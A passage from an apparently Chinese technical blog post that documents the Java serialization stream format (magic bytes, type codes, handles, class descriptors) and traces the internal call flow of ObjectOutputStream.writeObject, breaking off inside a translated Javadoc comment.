<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">STREAM_MAGIC  STREAM_VERSION  Record*</span><br><span class="line">AC ED          00 05          ...</span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>STREAM_MAGIC</strong>：<code>AC ED</code></li>
<li><strong>STREAM_VERSION</strong>：<code>00 05</code></li>
<li><strong>Record</strong>*：后面紧跟一个或多个记录（对象、类描述符、字符串、数组、引用、块数据、异常等），<strong>顺序完全由写端决定</strong>。</li>
</ul>

  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content markdown-body">
      <p>我们可以通过这个魔数来识别序列化数据，下面是一些常见编码下的特征：</p>
<ul>
<li><p>原始序列：<code>AC ED 00 05</code></p>
</li>
<li><p>Base64：<code>rO0</code></p>
</li>
<li><p>zip 格式：<code>PK*</code></p>
</li>
<li><p>zip+base64：<code>UE*</code></p>
</li>
<li><p>gzip+base64：<code>H4s*</code></p>
</li>
</ul>
<p>有时候我们也可以通过 HTTP 请求头来确定数据类型是序列化数据，例如：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-type: application/x-java-serialized-object</span><br></pre></td></tr></table></figure></div>

    </div>
  </div>

<h2 id="类型码"><a href="#类型码" class="headerlink" title="类型码"></a>类型码</h2><p>在序列化数据中，一个字段是由类型码开始的。类型码描述当前位置后续数据对应什么类型，Java 反序列化时会根据这个字段决定选择进入什么分支对后续数据进行反序列化。</p>
<table>
<thead>
<tr>
<th>码值</th>
<th>名称</th>
<th>含义（下一步…）</th>
</tr>
</thead>
<tbody><tr>
<td><code>0x70</code></td>
<td><code>TC_NULL</code></td>
<td>空引用</td>
</tr>
<tr>
<td><code>0x71</code></td>
<td><code>TC_REFERENCE</code></td>
<td>句柄回引：后跟 4 字节句柄（wire handle）</td>
</tr>
<tr>
<td><code>0x72</code></td>
<td><code>TC_CLASSDESC</code></td>
<td>普通类的类描述符</td>
</tr>
<tr>
<td><code>0x73</code></td>
<td><code>TC_OBJECT</code></td>
<td>对象本体</td>
</tr>
<tr>
<td><code>0x74</code></td>
<td><code>TC_STRING</code></td>
<td>短字符串</td>
</tr>
<tr>
<td><code>0x7C</code></td>
<td><code>TC_LONGSTRING</code></td>
<td>长字符串</td>
</tr>
<tr>
<td><code>0x75</code></td>
<td><code>TC_ARRAY</code></td>
<td>数组</td>
</tr>
<tr>
<td><code>0x76</code></td>
<td><code>TC_CLASS</code></td>
<td><code>java.lang.Class</code> 对象</td>
</tr>
<tr>
<td><code>0x77</code></td>
<td><code>TC_BLOCKDATA</code></td>
<td>块数据（长度 1 字节）</td>
</tr>
<tr>
<td><code>0x7A</code></td>
<td><code>TC_BLOCKDATALONG</code></td>
<td>块数据（长度 4 字节）</td>
</tr>
<tr>
<td><code>0x78</code></td>
<td><code>TC_ENDBLOCKDATA</code></td>
<td>块数据&#x2F;自定义数据结束</td>
</tr>
<tr>
<td><code>0x79</code></td>
<td><code>TC_RESET</code></td>
<td>句柄表重置</td>
</tr>
<tr>
<td><code>0x7B</code></td>
<td><code>TC_EXCEPTION</code></td>
<td>写端抛出的致命异常对象</td>
</tr>
<tr>
<td><code>0x7D</code></td>
<td><code>TC_PROXYCLASSDESC</code></td>
<td>代理类的类描述符</td>
</tr>
<tr>
<td><code>0x7E</code></td>
<td><code>TC_ENUM</code></td>
<td>枚举常量</td>
</tr>
</tbody></table>
<blockquote>
<p><strong>句柄（handle）</strong>：每个“首次出现”的对象&#x2F;字符串&#x2F;数组&#x2F;类描述符&#x2F;类对象都会被分配一个句柄。后续重复出现，用 <code>TC_REFERENCE</code> + (base+下标) 回指。</p>
<p>例如：若之后<strong>再次</strong>写入同一个 <code>String</code> 实例 <code>&quot;Bob&quot;</code>（同一对象，不是同值新对象），就会出现：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">71 00 7E 00 03   // TC_REFERENCE + 0x7E0003（示意）</span><br></pre></td></tr></table></figure></div>

<p><strong>wire handle 计算</strong>：<code>wire = 0x7E0000 + localIndex</code>；读端用 <code>wire - 0x7E0000</code> 找回本地句柄表的下标。</p>
</blockquote>
<h2 id="对象类型：TC-OBJECT"><a href="#对象类型：TC-OBJECT" class="headerlink" title="对象类型：TC_OBJECT"></a>对象类型：<code>TC_OBJECT</code></h2><p>在众多类型中，对象类型是最重要的，该类型码后续的结构如下：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TC_OBJECT</span><br><span class="line">  classDesc                 // 可以是 TC_CLASSDESC / TC_PROXYCLASSDESC / TC_REFERENCE</span><br><span class="line">  classdata                 // 按“父类 → 子类”的层级逐层写</span><br></pre></td></tr></table></figure></div>

<h3 id="类描述符（Class-Descriptor）"><a href="#类描述符（Class-Descriptor）" class="headerlink" title="类描述符（Class Descriptor）"></a>类描述符（Class Descriptor）</h3><h4 id="普通类：TC-CLASSDESC"><a href="#普通类：TC-CLASSDESC" class="headerlink" title="普通类：TC_CLASSDESC"></a>普通类：<code>TC_CLASSDESC</code></h4><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">TC_CLASSDESC</span><br><span class="line">  UTF className</span><br><span class="line">  long serialVersionUID</span><br><span class="line">  byte flags                // 是否 Serializable / Externalizable / ENUM / 有 writeObject / 是否 block-data 等</span><br><span class="line">  short fieldCount</span><br><span class="line">    [ fieldDesc * fieldCount ]</span><br><span class="line">  classAnnotations          // Block-Data（可选，可能为空），以 TC_ENDBLOCKDATA 结尾</span><br><span class="line">  superClassDesc            // 父类的类描述符（递归；到 Object 为 TC_NULL）</span><br></pre></td></tr></table></figure></div>

<p>其中 <code>flags</code> 常量有如下标志位：</p>
<table>
<thead>
<tr>
<th>标志</th>
<th>值</th>
<th>语义</th>
</tr>
</thead>
<tbody><tr>
<td><code>SC_WRITE_METHOD</code></td>
<td><code>0x01</code></td>
<td>定义了 <code>private void writeObject(ObjectOutputStream)</code>（⇒ 该层有“自定义区”，读完需见 <code>TC_ENDBLOCKDATA</code>）</td>
</tr>
<tr>
<td><code>SC_SERIALIZABLE</code></td>
<td><code>0x02</code></td>
<td><code>implements Serializable</code></td>
</tr>
<tr>
<td><code>SC_EXTERNALIZABLE</code></td>
<td><code>0x04</code></td>
<td><code>implements Externalizable</code>（与上一个互斥）</td>
</tr>
<tr>
<td><code>SC_BLOCK_DATA</code></td>
<td><code>0x08</code></td>
<td>Externalizable 在 <strong>v2 协议</strong>下使用块数据包裹</td>
</tr>
<tr>
<td><code>SC_ENUM</code></td>
<td><code>0x10</code></td>
<td>枚举类型（SUID 必须为 0；字段数为 0）</td>
</tr>
</tbody></table>
<p>字段描述 <code>fieldDesc</code> 结构为：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">byte typeCode               // &#x27;B&#x27;,&#x27;C&#x27;,&#x27;D&#x27;,&#x27;F&#x27;,&#x27;I&#x27;,&#x27;J&#x27;,&#x27;S&#x27;,&#x27;Z&#x27;,&#x27;L&#x27;,&#x27;[&#x27;</span><br><span class="line">UTF fieldName</span><br><span class="line">[ UTF typeString ]          // 仅当 typeCode 为 &#x27;L&#x27;(对象) 或 &#x27;[&#x27;(数组) 时存在，形如 &quot;Ljava/lang/String;&quot;、&quot;[I&quot;</span><br></pre></td></tr></table></figure></div>


  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content markdown-body">
      <p><strong>是否有 <code>readObject(..)</code> 并不写在描述符里</strong>；写端仅通过 <code>flags</code> 标出“有 <code>writeObject(..)</code>”（意味着该层会出现自定义 block-data）。读端会反射检测 <code>readObject(..)</code> 并调用。</p>

    </div>
  </div>

<h4 id="代理类：TC-PROXYCLASSDESC"><a href="#代理类：TC-PROXYCLASSDESC" class="headerlink" title="代理类：TC_PROXYCLASSDESC"></a>代理类：<code>TC_PROXYCLASSDESC</code></h4><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TC_PROXYCLASSDESC</span><br><span class="line">  int interfaceCount</span><br><span class="line">  UTF interfaceName[interfaceCount]</span><br><span class="line">  classAnnotations          // Block-Data（可选），以 TC_ENDBLOCKDATA 结尾</span><br><span class="line">  superClassDesc</span><br></pre></td></tr></table></figure></div>

<p>读端会通过 <code>resolveProxyClass(String[])</code>：按规则选 ClassLoader，<code>Class.forName</code> 加载接口，检查<strong>非 public 接口的类加载器必须一致</strong>，最终 <code>Proxy.getProxyClass(loader, ifaces)</code> 生成代理类。</p>
<h4 id="classdata（对象实例数据）"><a href="#classdata（对象实例数据）" class="headerlink" title="classdata（对象实例数据）"></a><code>classdata</code>（对象实例数据）</h4><p><strong>classdata 的每一层（某个可序列化类）有两种路径</strong>：</p>
<ul>
<li><strong>Externalizable</strong>（<code>flags</code> 指示）：<ul>
<li>v2 协议下以 Block-Data 包裹对象的 <code>writeExternal</code> 输出，末尾写 <code>TC_ENDBLOCKDATA</code>；</li>
<li>读端调用 <code>readExternal</code>，读完后用 <code>skipCustomData()</code> 吞掉剩余块直至 <code>TC_ENDBLOCKDATA</code>。</li>
</ul>
</li>
<li><strong>Serializable</strong>：<ul>
<li>**有 <code>writeObject(..)</code>**：写端进入 Block-Data，由自定义方法写“自定义区”（里面可以调用 <code>defaultWriteObject()</code> 写默认字段，也可以再写对象&#x2F;块）；结束后写 <code>TC_ENDBLOCKDATA</code>。读端进入块模式调用 <code>readObject(..)</code>，完了后用 <code>TC_ENDBLOCKDATA</code> 收尾（<code>skipCustomData()</code> 兜底）。</li>
<li><strong>无 <code>writeObject(..)</code><strong>：</strong>默认字段</strong>序列化（不包 <code>TC_ENDBLOCKDATA</code>）<ul>
<li>先按顺序写<strong>所有原始类型字段</strong>的字节；</li>
<li>再写<strong>所有对象&#x2F;数组字段</strong>，每个字段的值本身是一个“值记录”：<code>TC_NULL</code> &#x2F; <code>TC_REFERENCE</code> &#x2F; <code>TC_OBJECT</code> &#x2F; <code>TC_STRING</code> &#x2F; <code>TC_ARRAY</code> &#x2F; …</li>
<li>因为字段个数在类描述符里已知，所以不需要额外结束标记。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h1 id="序列化过程分析"><a href="#序列化过程分析" class="headerlink" title="序列化过程分析"></a>序列化过程分析</h1><p>通常我们通过下面这个过程将对象序列化：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">objectOutputStream.writeObject(object);</span><br></pre></td></tr></table></figure></div>

<p>序列化过程如下：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/09/09/Java%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/images/1945946143.jpg"
                      alt="img"
                ></p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(out)</span><br><span class="line">  ├─ verifySubclass()</span><br><span class="line">  ├─ bout = <span class="keyword">new</span> <span class="title class_">BlockDataOutputStream</span>(out)</span><br><span class="line">  ├─ handles = <span class="keyword">new</span> <span class="title class_">HandleTable</span>(...), subs = <span class="keyword">new</span> <span class="title class_">ReplaceTable</span>(...)</span><br><span class="line">  ├─ enableOverride = <span class="literal">false</span></span><br><span class="line">  ├─ writeStreamHeader() → STREAM_MAGIC, STREAM_VERSION</span><br><span class="line">  └─ bout.setBlockDataMode(<span class="literal">true</span>)                <span class="comment">// 进入“块数据模式”（后续会在需要时临时切换）</span></span><br><span class="line"></span><br><span class="line">writeObject(obj)</span><br><span class="line">  ├─ <span class="keyword">if</span> (enableOverride) → writeObjectOverride(obj) → <span class="keyword">return</span></span><br><span class="line">  └─ <span class="keyword">try</span> → writeObject0(obj, <span class="comment">/*unshared=*/</span><span class="literal">false</span>)</span><br><span class="line">       └─ <span class="keyword">catch</span>(IOException ex)</span><br><span class="line">            ├─ <span class="keyword">if</span> (depth==<span class="number">0</span>) → writeFatalException(ex)  <span class="comment">// 最外层写致命异常块</span></span><br><span class="line">            └─ rethrow</span><br><span class="line"></span><br><span class="line"><span class="title function_">writeObject0</span><span class="params">(obj, unshared)</span></span><br><span class="line">  ├─ old = bout.setBlockDataMode(<span class="literal">false</span>)         <span class="comment">// 切到“非块模式”写结构化标记</span></span><br><span class="line">  ├─ depth++</span><br><span class="line">  ├─ obj = subs.lookup(obj)                     <span class="comment">// 替换表命中则直接替换</span></span><br><span class="line">  ├─ 快速分支：</span><br><span class="line">  │   ├─ obj == <span class="literal">null</span>            → writeByte(TC_NULL) → <span class="keyword">finally</span></span><br><span class="line">  │   ├─ !unshared &amp;&amp; handles.lookup(obj) != -<span class="number">1</span></span><br><span class="line">  │   │    └─ writeByte(TC_REFERENCE) + writeInt(<span class="number">0x7E0000</span> + handle) → <span class="keyword">finally</span></span><br><span class="line">  │   ├─ obj <span class="keyword">instanceof</span> Class   → writeClass((Class)obj, unshared) → <span class="keyword">finally</span></span><br><span class="line">  │   └─ obj <span class="keyword">instanceof</span> ObjectStreamClass → writeClassDesc((OSC)obj, unshared) → <span class="keyword">finally</span></span><br><span class="line">  ├─ 替换链：</span><br><span class="line">  │   ├─ orig = obj</span><br><span class="line">  │   ├─ <span class="keyword">while</span> (desc.hasWriteReplace()) obj = desc.invokeWriteReplace(obj)</span><br><span class="line">  │   ├─ <span class="keyword">if</span> (enableReplace) obj = replaceObject(obj)</span><br><span class="line">  │   └─ <span class="keyword">if</span> (obj != orig) &#123;</span><br><span class="line">  │         subs.assign(orig, obj)              <span class="comment">// 记录 A→B 稳定替换</span></span><br><span class="line">  │         <span class="comment">// 再跑一遍“快速分支”（null / reference / Class / OSC）</span></span><br><span class="line">  │       &#125;</span><br><span class="line">  ├─ 类型分派：</span><br><span class="line">  │   ├─ String      → writeString(str, unshared)  <span class="comment">// TC_STRING/TC_LONGSTRING + UTF</span></span><br><span class="line">  │   ├─ Array       → writeArray(arr, desc, unshared)</span><br><span class="line">  │   ├─ Enum        → writeEnum(e, desc, unshared) <span class="comment">// TC_ENUM + 类型描述 + 常量名</span></span><br><span class="line">  │   └─ Serializable→ writeOrdinaryObject(obj, desc, unshared)</span><br><span class="line">  └─ <span class="keyword">finally</span></span><br><span class="line">      ├─ depth--</span><br><span class="line">      └─ bout.setBlockDataMode(old)             <span class="comment">// 恢复进入前的模式</span></span><br><span class="line"></span><br><span class="line">writeOrdinaryObject(obj, desc, unshared)</span><br><span class="line">  ├─ desc.checkSerialize()</span><br><span class="line">  ├─ writeByte(TC_OBJECT)</span><br><span class="line">  ├─ writeClassDesc(desc, <span class="comment">/*unshared=*/</span><span class="literal">false</span>)</span><br><span class="line">  │   ├─ <span class="keyword">if</span> (desc == <span class="literal">null</span>)      → writeByte(TC_NULL)</span><br><span class="line">  │   ├─ <span class="keyword">else</span> <span class="keyword">if</span> (handles.lookup(desc) != -<span class="number">1</span> &amp;&amp; 允许共享)</span><br><span class="line">  │   │     └─ writeByte(TC_REFERENCE) + writeInt(<span class="number">0x7E0000</span> + handle)</span><br><span class="line">  │   ├─ <span class="keyword">else</span> <span class="keyword">if</span> (desc.isProxy())</span><br><span class="line">  │   │     └─ writeProxyDesc(desc, unshared)</span><br><span class="line">  │   │         ├─ writeByte(TC_PROXYCLASSDESC)</span><br><span class="line">  │   │         ├─ handles.assign(unshared ? <span class="literal">null</span> : desc)</span><br><span class="line">  │   │         ├─ writeInt(接口数) + 逐个 writeUTF(接口名)</span><br><span class="line">  │   │         ├─ bout.setBlockDataMode(<span class="literal">true</span>) → annotateProxyClass(...) → setBlockDataMode(<span class="literal">false</span>)</span><br><span class="line">  │   │         ├─ writeByte(TC_ENDBLOCKDATA)</span><br><span class="line">  │   │         └─ writeClassDesc(desc.getSuperDesc(), <span class="literal">false</span>)</span><br><span class="line">  │   └─ <span class="keyword">else</span></span><br><span class="line">  │         └─ writeNonProxyDesc(desc, unshared)</span><br><span class="line">  │             ├─ writeByte(TC_CLASSDESC)</span><br><span class="line">  │             ├─ handles.assign(unshared ? <span class="literal">null</span> : desc)</span><br><span class="line">  │             ├─ <span class="keyword">if</span> (protocol==V1) desc.writeNonProxy(<span class="built_in">this</span>) <span class="keyword">else</span> writeClassDescriptor(desc)</span><br><span class="line">  │             ├─ bout.setBlockDataMode(<span class="literal">true</span>) → annotateClass(...) → setBlockDataMode(<span class="literal">false</span>)</span><br><span class="line">  │             ├─ writeByte(TC_ENDBLOCKDATA)</span><br><span class="line">  │             └─ writeClassDesc(desc.getSuperDesc(), <span class="literal">false</span>)</span><br><span class="line">  ├─ handles.assign(unshared ? <span class="literal">null</span> : obj)       <span class="comment">// 为实例分配句柄；unshared=占位但不登记</span></span><br><span class="line">  └─ <span class="keyword">if</span> (desc.isExternalizable() &amp;&amp; !desc.isProxy())</span><br><span class="line">       └─ writeExternalData((Externalizable)obj)</span><br><span class="line">           ├─ 保存并清空 [curPut, curContext]  <span class="comment">// 禁止 defaultWriteObject/putFields 误用</span></span><br><span class="line">           ├─ <span class="keyword">if</span> (protocol==V1) obj.writeExternal(<span class="built_in">this</span>)</span><br><span class="line">           ├─ <span class="keyword">else</span></span><br><span class="line">           │    ├─ bout.setBlockDataMode(<span class="literal">true</span>) → obj.writeExternal(<span class="built_in">this</span>)</span><br><span class="line">           │    ├─ bout.setBlockDataMode(<span class="literal">false</span>)</span><br><span class="line">           │    └─ writeByte(TC_ENDBLOCKDATA)</span><br><span class="line">           └─ 恢复 [curPut, curContext]</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">       └─ writeSerialData(obj, desc)             <span class="comment">// 父 → 子</span></span><br><span class="line">           └─ <span class="keyword">for</span> (slotDesc : desc.getClassDataLayout())</span><br><span class="line">               ├─ <span class="keyword">if</span> (slotDesc.hasWriteObjectMethod())</span><br><span class="line">               │    ├─ 保存并清空 [curPut], 切换 curContext=<span class="keyword">new</span> <span class="title class_">SerialCallbackContext</span>(...)</span><br><span class="line">               │    ├─ bout.setBlockDataMode(<span class="literal">true</span>)  → slotDesc.invokeWriteObject(obj, <span class="built_in">this</span>)</span><br><span class="line">               │    ├─ bout.setBlockDataMode(<span class="literal">false</span>) → writeByte(TC_ENDBLOCKDATA)</span><br><span class="line">               │    └─ 恢复 [curPut, curContext]</span><br><span class="line">               └─ <span class="keyword">else</span></span><br><span class="line">                    └─ defaultWriteFields(obj, slotDesc)</span><br><span class="line">                        ├─ slotDesc.checkDefaultSerialize()</span><br><span class="line">                        ├─ primSize = slotDesc.getPrimDataSize()</span><br><span class="line">                        ├─ primVals = pack primitive 字段字节</span><br><span class="line">                        ├─ bout.write(primVals, <span class="number">0</span>, primSize, <span class="literal">false</span>)   <span class="comment">// 纯字节，不写 ENDBLOCK</span></span><br><span class="line">                        └─ 写对象/数组字段：</span><br><span class="line">                           └─ objVals = slotDesc.getObjFieldValues(obj)</span><br><span class="line">                              └─ <span class="keyword">for</span> (i=<span class="number">0.</span>.)</span><br><span class="line">                                  └─ writeObject0(objVals[i], slotDesc.getFields(<span class="literal">false</span>)[base+i].isUnshared())</span><br><span class="line"></span><br><span class="line">writeString(str, unshared)</span><br><span class="line">  ├─ handles.assign(unshared ? <span class="literal">null</span> : str)</span><br><span class="line">  ├─ utflen = bout.getUTFLength(str)</span><br><span class="line">  ├─ <span class="keyword">if</span> (utflen &lt;= <span class="number">0xFFFF</span>)</span><br><span class="line">  │    └─ writeByte(TC_STRING)     → bout.writeUTF(str, utflen)</span><br><span class="line">  └─ <span class="keyword">else</span></span><br><span class="line">       └─ writeByte(TC_LONGSTRING) → bout.writeLongUTF(str, utflen)</span><br><span class="line"></span><br><span class="line">writeArray(arr, desc, unshared)</span><br><span class="line">  ├─ writeByte(TC_ARRAY)</span><br><span class="line">  ├─ writeClassDesc(desc, <span class="literal">false</span>)</span><br><span class="line">  ├─ handles.assign(unshared ? <span class="literal">null</span> : arr)</span><br><span class="line">  ├─ writeInt(length)</span><br><span class="line">  ├─ <span class="keyword">if</span> (原始类型数组)  → 连续写元素原始字节（必要时临时 blk=ON 以聚合）</span><br><span class="line">  └─ <span class="keyword">else</span>（对象数组） → <span class="keyword">for</span> (elem : arr) writeObject0(elem, <span class="comment">/*字段级unshared?*/</span><span class="literal">false</span>)</span><br><span class="line"></span><br><span class="line">writeEnum(e, desc, unshared)</span><br><span class="line">  ├─ writeByte(TC_ENUM)</span><br><span class="line">  ├─ writeClassDesc(desc, <span class="literal">false</span>)</span><br><span class="line">  └─ writeString(e.name(), <span class="literal">false</span>)</span><br></pre></td></tr></table></figure></div>



<h2 id="ObjectOutputStream-对象"><a href="#ObjectOutputStream-对象" class="headerlink" title="ObjectOutputStream 对象"></a>ObjectOutputStream 对象</h2><p>其中负责序列化的 <code>ObjectOutputStream</code> 是一个实现了 <code>ObjectOutput</code> 接口的 <code>OutputStream</code> 的子类，定义如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ObjectOutputStream 能把 Java 的原始数据类型以及**对象图**写入到一个 OutputStream 中；</span></span><br><span class="line"><span class="comment"> * 之后可由 ObjectInputStream 读取并“复原（reconstitute）”这些对象。</span></span><br><span class="line"><span class="comment"> * 若底层是文件流即可实现**持久化存储**；若底层是网络 Socket 流，则对象可在**另一进程/主机**上被复原。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;只有实现了 &#123;<span class="doctag">@link</span> java.io.Serializable&#125; 接口的对象才能被写入该流。</span></span><br><span class="line"><span class="comment"> * 对每个可序列化对象，序列化数据会包含：类名与类签名、对象字段与数组的值，以及</span></span><br><span class="line"><span class="comment"> * 由初始对象**可达的所有对象**（对象闭包，形成完整对象图）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;使用 &#123;<span class="doctag">@link</span> #writeObject(Object)&#125; 将对象写入流。任何对象（包括 String 与数组）</span></span><br><span class="line"><span class="comment"> * 都通过此方法写出；也可以在一个流里连续写出多个对象或原始类型。</span></span><br><span class="line"><span class="comment"> * **读取方必须以相同的类型与顺序**，用对应的 ObjectInputStream 读回这些数据。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;原始数据类型也可通过 &#123;<span class="doctag">@link</span> java.io.DataOutput&#125; 的相应方法写出；</span></span><br><span class="line"><span class="comment"> * 字符串还可以用 &#123;<span class="doctag">@link</span> #writeUTF(String)&#125; 写出。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;对象的**默认序列化机制**会写出：对象所属类、类签名，以及所有**非 transient 且非 static**</span></span><br><span class="line"><span class="comment"> * 字段的取值。对其它对象的引用（不含 transient/static 字段中的引用）也会被写出。</span></span><br><span class="line"><span class="comment"> * 对**同一个对象的多次引用**会用**引用共享机制**（句柄）编码，以便在反序列化时恢复出与原始对象图</span></span><br><span class="line"><span class="comment"> * **形状一致**的共享与环状关系。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;示例（与 ObjectInputStream 示例配套）：</span></span><br><span class="line"><span class="comment"> * &lt;br&gt;</span></span><br><span class="line"><span class="comment"> * &lt;pre&gt;</span></span><br><span class="line"><span class="comment"> *     FileOutputStream fos = new FileOutputStream(&quot;t.tmp&quot;);</span></span><br><span class="line"><span class="comment"> *     ObjectOutputStream oos = new ObjectOutputStream(fos);</span></span><br><span class="line"><span class="comment"> 